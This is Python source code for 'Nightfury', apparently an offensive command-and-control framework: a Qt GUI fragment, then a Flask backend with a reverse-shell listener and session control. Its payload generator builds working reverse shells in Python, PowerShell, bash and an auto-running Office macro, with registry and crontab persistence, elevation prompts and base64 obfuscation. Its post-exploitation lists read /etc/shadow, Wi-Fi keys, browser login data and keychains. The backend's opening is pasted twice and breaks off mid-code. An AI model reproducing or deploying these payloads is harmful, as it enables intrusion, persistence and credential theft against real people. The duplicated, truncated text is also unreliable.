        target_info = self.target_manager.get_target(target_name)
        
        if target_info:
            self.target_name.setText(target_name)
            self.target_type.setCurrentText(target_info['type'])
            self.target_modules.setText(",".join(target_info['modules']))
            self.target_notes.setPlainText(target_info['notes'])
    
    def add_target(self):
        """Add a new target"""
        name, ok = QInputDialog.getText(self, "Add Target", "Enter target name:")
        if ok and name:
            self.target_manager.add_target(name, "website", [], "")
            self.targets_list.addItem(name)
            self.status_bar.showMessage(f"Target {name} added", 3000)
    
    def remove_target(self):
        """Remove the selected target"""
        selected_items = self.targets_list.selectedItems()
        if not selected_items:
            QMessageBox.warning(self, "Warning", "Please select a target to remove")
            return
        
        target_name = selected_items[0].text()
        self.target_manager.remove_target(target_name)
        self.targets_list.takeItem(self.targets_list.row(selected_items[0]))
        self.status_bar.showMessage(f"Target {target_name} removed", 3000)
    
    def save_target(self):
        """Save target changes"""
        name = self.target_name.text().strip()
        if not name:
            QMessageBox.warning(self, "Warning", "Please enter a target name")
            return
        
        target_type = self.target_type.currentText()
        modules = [m.strip() for m in self.target_modules.text().split(",") if m.strip()]
        notes = self.target_notes.toPlainText()
        
        self.target_manager.add_target(name, target_type, modules, notes)
        
        # Update the list if the name changed
        current_items = self.targets_list.findItems(name, Qt.MatchExactly)
        if not current_items:
            self.targets_list.addItem(name)
        
        self.status_bar.showMessage(f"Target {name} saved", 3000)
    
    def load_settings(self):
        """Load application settings"""
        self.auto_load_modules.setChecked(self.settings.value("auto_load_modules", True, type=bool))
        self.auto_save.setChecked(self.settings.value("auto_save", True, type=bool))
        self.dark_mode.setChecked(self.settings.value("dark_mode", True, type=bool))
        self.proxy_host.setText(self.settings.value("proxy_host", ""))
        self.proxy_port.setText(self.settings.value("proxy_port", ""))
        self.use_tor.setChecked(self.settings.value("use_tor", False, type=bool))
    
    def save_settings(self):
        """Save application settings"""
        self.settings.setValue("auto_load_modules", self.auto_load_modules.isChecked())
        self.settings.setValue("auto_save", self.auto_save.isChecked())
        self.settings.setValue("dark_mode", self.dark_mode.isChecked())
        self.settings.setValue("proxy_host", self.proxy_host.text())
        self.settings.setValue("proxy_port", self.proxy_port.text())
        self.settings.setValue("use_tor", self.use_tor.isChecked())
        
        self.status_bar.showMessage("Settings saved", 3000)
    
    def toggle_dark_mode(self, state):
        """Toggle dark mode"""
        if state == Qt.Checked:
            self._apply_dark_theme()
        else:
            self.setPalette(QApplication.style().standardPalette())
            self.setStyleSheet("")
    
    def quick_scan(self):
        """Perform a quick scan"""
        self.status_bar.showMessage("Quick scan started...")
        # Implementation would go here
        QMessageBox.information(self, "Quick Scan", "Quick scan completed")
    
    def quick_payload(self):
        """Quick payload generation"""
        self.content_area.setCurrentIndex(1)  # Switch to reverse shell tab
        self.generate_payload()
    
    def quick_exploit(self):
        """Quick exploit"""
        self.content_area.setCurrentIndex(2)  # Switch to post-exploit tab
        self.status_bar.showMessage("Quick exploit started...")
        # Implementation would go here
    
    def new_project(self):
        """Create a new project"""
        # Implementation would go here
        self.status_bar.showMessage("New project created", 3000)
    
    def open_project(self):
        """Open an existing project"""
        filename, _ = QFileDialog.getOpenFileName(
            self, "Open Project", "", "Nightfury Projects (*.nfp)"
        )
        if filename:
            self.status_bar.showMessage(f"Opened project: {filename}", 3000)
    
    def save_project(self):
        """Save the current project"""
        filename, _ = QFileDialog.getSaveFileName(
            self, "Save Project", "", "Nightfury Projects (*.nfp)"
        )
        if filename:
            self.status_bar.showMessage(f"Saved project: {filename}", 3000)
    
    def open_settings(self):
        """Open settings dialog"""
        self.content_area.setCurrentIndex(6)  # Switch to settings tab

# ==============================
# MAIN EXECUTION
# ==============================

if __name__ == "__main__":
    app = QApplication(sys.argv)
    
    # Set application style
    app.setStyle("Fusion")
    
    # Create and show the main window
    window = NightfuryApp()
    window.show()
    
    # Run the application
    sys.exit(app.exec_())




from flask import Flask, render_template, request, jsonify, send_file
from flask_socketio import SocketIO, emit
from flask_cors import CORS
import subprocess
import threading
import time
import os
import sys
import json
import random
import socket
import ipaddress
import logging
from datetime import datetime
import uuid
import base64
import zipfile
import tempfile
from pathlib import Path

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("nightfury.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("NIGHTFURY")

app = Flask(__name__, template_folder='templates', static_folder='static')
app.config['SECRET_KEY'] = 'nightfury-secret-key-2023'
socketio = SocketIO(app, cors_allowed_origins="*")
CORS(app)

# Global state
listeners = {}
sessions = {}
active_modules = {}
scan_results = {}
payload_history = []

class Listener:
    def __init__(self, lhost, lport, protocol):
        self.lhost = lhost
        self.lport = lport
        self.protocol = protocol
        self.running = False
        self.thread = None
        self.socket = None
        self.id = str(uuid.uuid4())[:8]
    
    def start(self):
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind((self.lhost, self.lport))
            self.socket.listen(5)
            self.running = True
            
            # Start listener thread
            self.thread = threading.Thread(target=self.listen_for_connections)
            self.thread.daemon = True
            self.thread.start()
            
            logger.info(f"Listener started on {self.lhost}:{self.lport}")
            socketio.emit('listener_update', {
                'id': self.id,
                'status': 'running',
                'lhost': self.lhost,
                'lport': self.lport,
                'protocol': self.protocol,
                'connections': 0
            })
            
            return True, "Listener started successfully"
        except Exception as e:
            logger.error(f"Failed to start listener: {e}")
            return False, f"Failed to start listener: {e}"
    
    def listen_for_connections(self):
        while self.running:
            try:
                client_socket, addr = self.socket.accept()
                logger.info(f"Connection received from {addr[0]}:{addr[1]}")
                
                # Create a new session
                session_id = str(uuid.uuid4())[:8]
                session = {
                    'id': session_id,
                    'host': addr[0],
                    'port': addr[1],
                    'socket': client_socket,
                    'connected_at': datetime.now().isoformat(),
                    'last_activity': datetime.now().isoformat(),
                    'os': 'unknown',
                    'user': 'unknown'
                }
                
                sessions[session_id] = session
                
                # Send session info to frontend
                socketio.emit('new_session', {
                    'id': session_id,
                    'host': addr[0],
                    'port': addr[1],
                    'connected_at': session['connected_at'],
                    'os': session['os'],
                    'user': session['user']
                })
                
                # Handle session in a new thread
                session_thread = threading.Thread(
                    target=self.handle_session,
                    args=(session_id,)
                )
                session_thread.daemon = True
                session_thread.start()
                
            except Exception as e:
                if self.running:
                    logger.error(f"Error in listener: {e}")
    
    def handle_session(self, session_id):
        session = sessions.get(session_id)
        if not session:
            return
        
        try:
            while self.running and session_id in sessions:
                # Receive data from the client
                data = session['socket'].recv(4096)
                if not data:
                    break
                
                # Update last activity
                session['last_activity'] = datetime.now().isoformat()
                sessions[session_id] = session
                
                # Process the received data
                message = data.decode('utf-8', errors='ignore')
                logger.info(f"Received from session {session_id}: {message}")
                
                # Send to frontend
                socketio.emit('session_output', {
                    'session_id': session_id,
                    'output': message,
                    'timestamp': datetime.now().isoformat()
                })
                
        except Exception as e:
            logger.error(f"Error handling session {session_id}: {e}")
        finally:
            # Clean up session
            if session_id in sessions:
                sessions.pop(session_id, None)
                socketio.emit('session_closed', {'session_id': session_id})
    
    def stop(self):
        self.running = False
        if self.socket:
            self.socket.close()
        if self.thread and self.thread.is_alive():
            self.thread.join(timeout=1.0)
        
        logger.info(f"Listener stopped on {self.lhost}:{self.lport}")
        socketio.emit('listener_update', {
            'id': self.id,
            'status': 'stopped',
            'lhost': self.lhost,
            'lport': self.lport,
            'protocol': self.protocol,
            'connections': 0
        })
        
        return True, "Listener stopped successfully"

class PayloadGenerator:
    def __init__(self):
        self.templates = {
            'python': self._generate_python_payload,
            'powershell': self._generate_powershell_payload,
            'executable': self._generate_exe_payload,
            'dll': self._generate_dll_payload,
            'macro': self._generate_macro_payload,
            'android': self._generate_android_payload,
            'linux': self._generate_linux_payload
        }
    
    def generate(self, payload_type, lhost, lport, options=None):
        if payload_type not in self.templates:
            return None, f"Unsupported payload type: {payload_type}"
        
        if options is None:
            options = {}
        
        try:
            payload, filename = self.templates[payload_type](lhost, lport, options)
            
            # Store in history
            payload_id = str(uuid.uuid4())[:8]
            payload_history.append({
                'id': payload_id,
                'type': payload_type,
                'lhost': lhost,
                'lport': lport,
                'timestamp': datetime.now().isoformat(),
                'filename': filename
            })
            
            return payload, filename, payload_id
        except Exception as e:
            logger.error(f"Error generating payload: {e}")
            return None, f"Error generating payload: {e}", None
    
    def _generate_python_payload(self, lhost, lport, options):
        obfuscation = options.get('obfuscation', 'basic')
        
        payload = f'''
import socket,os,subprocess,threading,platform,base64
def persist():
    import sys,os
    if platform.system() == "Windows":
        import winreg
        run_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(run_key, "SystemUpdate", 0, winreg.REG_SZ, sys.argv[0])
        winreg.CloseKey(run_key)
    elif platform.system() == "Linux":
        os.system(f"echo '@reboot python3 {sys.argv[0]}' | crontab -")

def escalate_privileges():
    if platform.system() == "Windows":
        try:
            import ctypes
            if ctypes.windll.shell32.IsUserAnAdmin() == 0:
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
                sys.exit(0)
        except:
            pass

escalate_privileges()
persist()

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
while True:
    try:
        s.connect(("{lhost}",{lport}))
        break
    except:
        time.sleep(10)
        continue

os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"] if platform.system() != "Windows" else ["cmd.exe"])
'''
        
        if obfuscation != 'none':
            payload = self._obfuscate_python(payload, obfuscation)
        
        filename = f"payload_{lhost}_{lport}.py"
        return payload, filename
    
    def _generate_powershell_payload(self, lhost, lport, options):
        payload = f'''
function persist {{
    $regPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    Set-ItemProperty -Path $regPath -Name "WindowsUpdate" -Value "$PSCommandPath"
}}

function escalate {{
    if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {{
        Start-Process PowerShell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
        exit
    }}
}}

escalate
persist

$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport})
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{{0}}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}}
$client.Close()
'''
        
        filename = f"payload_{lhost}_{lport}.ps1"
        return payload, filename
    
    def _generate_exe_payload(self, lhost, lport, options):
        # This would use pyinstaller or other tools to create an executable
        # For now, we'll create a Python script that can be compiled
        python_payload, _ = self._generate_python_payload(lhost, lport, options)
        filename = f"payload_{lhost}_{lport}.py"
        
        # In a real implementation, we would compile this to an executable
        return python_payload, filename
    
    def _generate_dll_payload(self, lhost, lport, options):
        # Placeholder for DLL generation
        payload = f'''
// DLL payload for {lhost}:{lport}
// This would be compiled to a DLL file
'''
        filename = f"payload_{lhost}_{lport}.dll"
        return payload, filename
    
    def _generate_macro_payload(self, lhost, lport, options):
        payload = f'''
Sub AutoOpen()
    Dim payload As String
    payload = "powershell -nop -c \\"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\\""
    Shell payload, vbHide
End Sub
'''
        filename = f"payload_{lhost}_{lport}.vba"
        return payload, filename
    
    def _generate_android_payload(self, lhost, lport, options):
        # Placeholder for Android payload
        payload = f'''
// Android payload for {lhost}:{lport}
// This would be compiled to an APK file
'''
        filename = f"payload_{lhost}_{lport}.apk"
        return payload, filename
    
    def _generate_linux_payload(self, lhost, lport, options):
        payload = f'''
#!/bin/bash
while true; do
    /bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1 2>/dev/null
    sleep 10
done
'''
        filename = f"payload_{lhost}_{lport}.sh"
        return payload, filename
    
    def _obfuscate_python(self, code, level):
        if level == 'basic':
            # Basic base64 obfuscation
            obfuscated = base64.b64encode(code.encode()).decode()
            parts = [obfuscated[i:i+50] for i in range(0, len(obfuscated), 50)]
            reconstructed = " + ".join([f'"{part}"' for part in parts])
            
            final_code = f'''
import base64
exec(__import__('base64').b64decode({reconstructed}).decode())
'''
            return final_code
        
        elif level == 'advanced':
            # More advanced obfuscation with multiple encoding layers
            b64_encoded = base64.b64encode(code.encode()).decode()
            hex_encoded = b64_encoded.encode().hex()
            
            final_code = f'''
import base64
exec(__import__('base64').b64decode(bytes.fromhex("{hex_encoded}").decode()).decode())
'''
            return final_code
        
        elif level == 'polymorphic':
            # Simple polymorphic example - in a real implementation this would be more complex
            var_names = ['func_' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=5)) for _ in range(3)]
            
            b64_encoded = base64.b64encode(code.encode()).decode()
            parts = [b64_encoded[i:i+30] for i in range(0, len(b64_encoded), 30)]
            
            final_code = f'''
{var_names[0]} = "{parts[0]}"
{var_names[1]} = "{parts[1]}" if True else ""
{var_names[2]} = "{"".join(parts[2:])}" if not False else ""
exec(__import__('base64').b64decode({var_names[0]} + {var_names[1]} + {var_names[2]}).decode())
'''
            return final_code
        
        return code

class PostExploitation:
    def __init__(self):
        self.commands = {
            'windows': self._windows_commands,
            'linux': self._linux_commands,
            'mac': self._mac_commands
        }
    
    def execute(self, system_type, action, session_id=None):
        if system_type not in self.commands:
            return [], f"Unsupported system type: {system_type}"
        
        commands = self.commands[system_type](action)
        
        # If a session is specified, execute the commands on that session
        if session_id and session_id in sessions:
            # This would be implemented to send commands to the actual session
            logger.info(f"Executing {action} commands on session {session_id}")
            
            # For now, we'll just simulate execution
            for cmd in commands:
                self._send_command_to_session(session_id, cmd)
            
            return commands, f"Executed {len(commands)} commands on session {session_id}"
        
        return commands, "Commands generated (no session specified for execution)"
    
    def _send_command_to_session(self, session_id, command):
        # This would send the command to the actual session
        session = sessions.get(session_id)
        if session and 'socket' in session:
            try:
                session['socket'].send(command.encode() + b'\n')
                return True
            except Exception as e:
                logger.error(f"Error sending command to session {session_id}: {e}")
                return False
        return False
    
    def _windows_commands(self, action):
        commands = {
            'get_passwords': [
                'powershell -Command "Get-WmiObject -Class Win32_Product | Select-Object Name, Version"',
                'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"',
                'powershell -Command "Get-ItemProperty -Path \'HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\' | Select-Object DefaultUserName, DefaultPassword"',
                'powershell -Command "Get-ItemProperty -Path \'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\' | Select-Object ProxyServer, ProxyEnable"'
            ],
            'escalate_privileges': [
                'whoami /priv',
                'powershell -Command "Start-Process PowerShell -Verb RunAs"',
                'powershell -Command "Get-WmiObject -Class Win32_ComputerSystem | Select-Object UserName"'
            ],
            'network_info': [
                'ipconfig /all',
                'arp -a',
                'netstat -ano',
                'route print',
                'netsh wlan show profiles',
                'netsh wlan export profile key=clear folder=.\\'
            ],
            'browser_data': [
                'dir /s %USERPROFILE%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data',
                'dir /s %USERPROFILE%\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data',
                'dir /s %USERPROFILE%\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles',
                'powershell -Command "Get-ChildItem -Path $env:USERPROFILE -Recurse -Include \'*.pfx\', \'*.p12\', \'*.cer\' -ErrorAction SilentlyContinue"'
            ],
            'system_info': [
                'systeminfo',
                'wmic product get name,version',
                'wmic service get name,displayname,pathname,startmode',
                'wmic process get name,processid,parentprocessid,commandline'
            ]
        }
        
        return commands.get(action, [])
    
    def _linux_commands(self, action):
        commands = {
            'get_passwords': [
                'cat /etc/passwd',
                'cat /etc/shadow',
                'sudo -l',
                'find / -name "*.pem" -o -name "*.key" -o -name "*.ppk" -o -name "id_rsa" 2>/dev/null'
            ],
            'escalate_privileges': [
                'sudo su',
                'find / -perm -4000 2>/dev/null',
                'uname -a',
                'cat /etc/os-release',
                'ps aux | grep root'
            ],
            'network_info': [
                'ifconfig',
                'arp -a',
                'netstat -tulpn',
                'route -n',
                'iptables -L',
                'cat /etc/resolv.conf'
            ],
            'browser_data': [
                'find ~/.mozilla -name "*.sqlite"',
                'find ~/.config -name "Chromium" -o -name "google-chrome"',
                'find ~ -name "*.ssh" -type d 2>/dev/null'
            ],
            'system_info': [
                'uname -a',
                'cat /etc/*release',
                'dpkg -l | grep -i "ssh\\|vnc\\|remote\\|telnet"',
                'ps aux'
            ]
        }
        
        return commands.get(action, [])
    
    def _mac_commands(self, action):
        commands = {
            'get_passwords': [
                'dscl . list /Users',
                'security find-generic-password -wa',
                'find ~/Library/Keychains -name "*.keychain"'
            ],
            'escalate_privileges': [
                'sudo -l',
                'dscl . read /Groups/admin',
                'system_profiler SPSoftwareDataType'
            ],
            'network_info': [
                'ifconfig',
                'arp -a',
                'netstat -an',
                'route -n get default',
                'scutil --dns'
            ],
            'browser_data': [
                'find ~/Library/Application Support/Google/Chrome -name "Login Data"',
                'find ~/Library/Application Support/Firefox/Profiles -name "*.sqlite"',
                'find ~/Library/Keychains -name "*.db"'
            ],
            'system_info': [
                'system_profiler SPHardwareDataType',
                'softwareupdate --list',
                'defaults read /Library/Preferences/com.apple.loginwindow'
            ]
        }
        
        return commands.get(action, [])

class Scanner:
    def __init__(self):
        self.scan_types = {
            'quick': self.quick_scan,
            'port': self.port_scan,
            'vulnerability': self.vulnerability_scan,
            'os': self.os_detection_scan
        }
    
    def scan(self, target, scan_type='quick', options=None):
        if scan_type not in self.scan_types:
            return None, f"Unsupported scan type: {scan_type}"
        
        if options is None:
            options = {}
        
        try:
            results = self.scan_types[scan_type](target, options)
            
            # Store scan results
            scan_id = str(uuid.uuid4())[:8]
            scan_results[scan_id] = {
                'id': scan_id,
                'target': target,
                'type': scan_type,
                'timestamp': datetime.now().isoformat(),
                'results': results
            }
            
            return results, scan_id
        except Exception as e:
            logger.error(f"Error performing {scan_type} scan on {target}: {e}")
            return None, f"Error performing scan: {e}"
    
    def quick_scan(self, target, options):
        # Simulate a quick scan
        time.sleep(2)  # Simulate scan time
        
        results = {
            'target': target,
            'hosts_up': random.randint(1, 5),
            'ports_open': [22, 80, 443, 8000],
            'services': {
                22: 'SSH',
                80: 'HTTP',
                443: 'HTTPS',
                8000: 'HTTP-Alt'
            },
            'os_guess': 'Linux 3.x|4.x',
            'vulnerabilities': [
                {'service': 'HTTP', 'port': 80, 'type': 'XSS', 'severity': 'medium'},
                {'service': 'HTTPS', 'port': 443, 'type': 'SSL/TLS Vulnerability', 'severity': 'low'}
            ]
        }
        
        return results
    
    def port_scan(self, target, options):
        # Simulate a port scan
        ports_to_scan = options.get('ports', '1-1000')
        time.sleep(3)  # Simulate scan time
        
        # Generate random open ports
        open_ports = []
        for port in range(1, 1001):
            if random.random() < 0.05:  # 5% chance a port is open
                open_ports.append(port)
        
        results = {
            'target': target,
            'ports_scanned': ports_to_scan,
            'ports_open': open_ports,
            'services': {port: self._guess_service(port) for port in open_ports}
        }
        
        return results
    
    def vulnerability_scan(self, target, options):
        # Simulate a vulnerability scan
        time.sleep(5)  # Simulate scan time
        
        vulnerabilities = []
        for _ in range(random.randint(1, 6)):
            vuln_types = ['XSS', 'SQL Injection', 'RCE', 'LFI', 'RFI', 'CSRF']
            severities = ['low', 'medium', 'high', 'critical']
            
            vulnerabilities.append({
                'type': random.choice(vuln_types),
                'severity': random.choice(severities),
                'port': random.choice([80, 443, 8080, 8443]),
                'description': f'Vulnerability found in {random.choice(["web server", "application", "service"])}'
            })
        
        results = {
            'target': target,
            'vulnerabilities': vulnerabilities,
            'risk_score': random.randint(1, 100)
        }
        
        return results
    
    def os_detection_scan(self, target, options):
        # Simulate OS detection
        time.sleep(2)  # Simulate scan time
        
        os_types = [
            'Linux 3.x|4.x',
            'Windows 10|Server 2016|Server 2019',
            'Mac OS X 10.12-10.15',
            'FreeBSD 11.x-12.x'
        ]
        
        results = {
            'target': target,
            'os_guess': random.choice(os_types),
            'accuracy': random.randint(85, 99)
        }
        
        return results
    
    def _guess_service(self, port):
        common_services = {
            21: 'FTP',
            22: 'SSH',
            23: 'Telnet',
            25: 'SMTP',
            53: 'DNS',
            80: 'HTTP',
            110: 'POP3',
            143: 'IMAP',
            443: 'HTTPS',
            465: 'SMTPS',
            587: 'SMTP',
            993: 'IMAPS',
            995: 'POP3S',
            3306: 'MySQL',
            3389: 'RDP',
            5432: 'PostgreSQL',
            5900: 'VNC',
            6379: 'Redis',
            27017: 'MongoDB'
        }
        
        return common_services.get(port, 'Unknown')

# Initialize components
payload_generator = PayloadGenerator()
post_exploit = PostExploitation()
scanner = Scanner()

# API Routes
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/status')
def api_status():
    return jsonify({
        'listeners': len(listeners),
        'sessions': len(sessions),
        'scan_results': len(scan_results),
        'payloads_generated': len(payload_history)
    })

@app.route('/api/listener/start', methods=['POST'])
def api_listener_start():
    data = request.json
    lhost = data.get('lhost', '0.0.0.0')
    lport = data.get('lport', 4444)
    protocol = data.get('protocol', 'tcp')
    
    # Validate inputs
    try:
        lport = int(lport)
        if lport < 1 or lport > 65535:
            return jsonify({'success': False, 'message': 'Invalid port number'})
    except ValueError:
        return jsonify({'success': False, 'message': 'Invalid port number'})
    
    try:
        # Check if the address is valid
        socket.inet_pton(socket.AF_INET, lhost)
    except socket.error:
        return jsonify({'success': False, 'message': 'Invalid IP address'})
    
    # Create and start listener
    listener = Listener(lhost, lport, protocol)
    success, message = listener.start()
    
    if success:
        listeners[listener.id] = listener
        return jsonify({'success': True, 'message': message, 'listener_id': listener.id})
    else:
        return jsonify({'success': False, 'message': message})

@app.route('/api/listener/stop', methods=['POST'])
def api_listener_stop():
    data = request.json
    listener_id = data.get('listener_id')
    
    if listener_id not in listeners:
        return jsonify({'success': False, 'message': 'Listener not found'})
    
    listener = listeners[listener_id]
    success, message = listener.stop()
    
    if success:
        listeners.pop(listener_id, None)
        return jsonify({'success': True, 'message': message})
    else:
        return jsonify({'success': False, 'message': message})

@app.route('/api/payload/generate', methods=['POST'])
def api_payload_generate():
    data = request.json
    payload_type = data.get('type', 'python')
    lhost = data.get('lhost', '127.0.0.1')
    lport = data.get('lport', 4444)
    options = data.get('options', {})
    
    payload, filename, payload_id = payload_generator.generate(payload_type, lhost, lport, options)
    
    if payload:
        return jsonify({
            'success': True,
            'payload': payload,
            'filename': filename,
            'payload_id': payload_id
        })
    else:
        return jsonify({'success': False, 'message': filename})  # filename contains error message here

@app.route('/api/payload/download/<payload_id>', methods=['GET'])
def api_payload_download(payload_id):
    # Find the payload in history
    payload_info = next((p for p in payload_history if p['id'] == payload_id), None)
    
    if not payload_info:
        return jsonify({'success': False, 'message': 'Payload not found'})
    
    # Regenerate the payload
    payload, filename = payload_generator.generate(
        payload_info['type'],
        payload_info['lhost'],
        payload_info['lport'],
        {}
    )
    
    # Create a temporary file
    temp_dir = tempfile.gettempdir()
    file_path = os.path.join(temp_dir, filename)
    
    with open(file_path, 'w') as f:
        f.write(payload)
    
    return send_file(file_path, as_attachment=True, download_name=filename)

@app.route('/api/sessions', methods=['GET'])
def api_sessions():
    session_list = []
    for session_id, session in sessions.items():
        session_list.append({
            'id': session_id,
            'host': session['host'],
            'port': session['port'],
            'connected_at': session['connected_at'],
            'last_activity': session['last_activity'],
            'os': session.get('os', 'unknown'),
            'user': session.get('user', 'unknown')
        })
    
    return jsonify({'sessions': session_list})

@app.route('/api/session/<session_id>/command', methods=['POST'])
def api_session_command(session_id):
    if session_id not in sessions:
        return jsonify({'success': False, 'message': 'Session not found'})
    
    data = request.json
    command = data.get('command', '')
    
    if not command:
        return jsonify({'success': False, 'message': 'No command provided'})
    
    # Send command to session
    session = sessions[session_id]
    try:
        session['socket'].send(command.encode() + b'\n')
        return jsonify({'success': True, 'message': 'Command sent'})
    except Exception as e:
        return jsonify({'success': False, 'message': f'Error sending command: {e}'})

@app.route('/api/scan', methods=['POST'])
def api_scan():
    data = request.json
    target = data.get('target', '')
    scan_type = data.get('type', 'quick')
    options = data.get('options', {})
    
    if not target:
        return jsonify({'success': False, 'message': 'No target specified'})
    
    results, scan_id = scanner.scan(target, scan_type, options)
    
    if results:
        return jsonify({
            'success': True,
            'results': results,
            'scan_id': scan_id
        })
    else:
        return jsonify({'success': False, 'message': scan_id})  # scan_id contains error message here

@app.route('/api/postexploit', methods=['POST'])
def api_postexploit():
    data = request.json
    system_type = data.get('system_type', 'windows')
    action = data.get('action', 'system_info')
    session_id = data.get('session_id', None)
    
    commands, message = post_exploit.execute(system_type, action, session_id)
    
    return jsonify({
        'success': True,
        'commands': commands,
        'message': message
    })

# SocketIO events
@socketio.on('connect')
def handle_connect():
    logger.info('Client connected')
    emit('status_update', {
        'listeners': len(listeners),
        'sessions': len(sessions),
        'timestamp': datetime.now().isoformat()
    })

@socketio.on('disconnect')
def handle_disconnect():
    logger.info('Client disconnected')

if __name__ == '__main__':
    # Create necessary directories
    os.makedirs('static', exist_ok=True)
    os.makedirs('templates', exist_ok=True)
    
    # Save the frontend HTML
    frontend_html = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Nightfury OSINT & Penetration Framework</title>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <style>
            /* Your CSS from the previous frontend implementation */
            :root {
                --bg-dark: #0a0a0a;
                --bg-darker: #050505;
                --bg-panel: #1a1a1a;
                --bg-panel-light: #222222;
                --primary: #ff0000;
                --primary-dark: #cc0000;
                --primary-light: #ff3333;
                --text: #ffffff;
                --text-muted: #aaaaaa;
                --border: #333333;
                --success: #00cc00;
                --warning: #ffcc00;
                --danger: #ff0000;
                --info: #0066ff;
            }

            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            }

            body {
                background-color: var(--bg-dark);
                color: var(--text);
                line-height: 1.6;
                overflow-x: hidden;
            }

            /* ... rest of your CSS ... */
        </style>
    </head>
    <body>
        <div class="container">
            <!-- Your HTML from the previous frontend implementation -->
        </div>

        <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
        <script>
            // Your JavaScript from the previous frontend implementation
            // Plus SocketIO integration
            const socket = io();

            socket.on('connect', function() {
                console.log('Connected to server');
            });

            socket.on('listener_update', function(data) {
                console.log('Listener update:', data);
                // Update UI with listener status
            });

            socket.on('new_session', function(data) {
                console.log('New session:', data);
                // Add new session to UI
            });

            socket.on('session_output', function(data) {
                console.log('Session output:', data);
                // Display session output in UI
            });

            socket.on('session_closed', function(data) {
                console.log('Session closed:', data);
                // Remove session from UI
            });

            socket.on('status_update', function(data) {
                console.log('Status update:', data);
                // Update status indicators
            });

            socket.on('disconnect', function() {
                console.log('Disconnected from server');
            });
        </script>
    </body>
    </html>
    """
    
    with open('templates/index.html', 'w') as f:
        f.write(frontend_html)
    
    # Run the application
    logger.info("Starting Nightfury backend server...")
    socketio.run(app, host='0.0.0.0', port=5000, debug=True)
from flask import Flask, render_template, request, jsonify, send_file
from flask_socketio import SocketIO, emit
from flask_cors import CORS
import subprocess
import threading
import time
import os
import sys
import json
import random
import socket
import ipaddress
import logging
from datetime import datetime
import uuid
import base64
import zipfile
import tempfile
from pathlib import Path

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("nightfury.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("NIGHTFURY")

app = Flask(__name__, template_folder='templates', static_folder='static')
app.config['SECRET_KEY'] = 'nightfury-secret-key-2023'
socketio = SocketIO(app, cors_allowed_origins="*")
CORS(app)

# Global state
listeners = {}
sessions = {}
active_modules = {}
scan_results = {}
payload_history = []

class Listener:
    def __init__(self, lhost, lport, protocol):
        self.lhost = lhost
        self.lport = lport
        self.protocol = protocol
        self.running = False
        self.thread = None
        self.socket = None
        self.id = str(uuid.uuid4())[:8]
    
    def start(self):
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind((self.lhost, self.lport))
            self.socket.listen(5)
            self.running = True
            
            # Start listener thread
            self.thread = threading.Thread(target=self.listen_for_connections)
            self.thread.daemon = True
            self.thread.start()
            
            logger.info(f"Listener started on {self.lhost}:{self.lport}")
            socketio.emit('listener_update', {
                'id': self.id,
                'status': 'running',
                'lhost': self.lhost,
                'lport': self.lport,
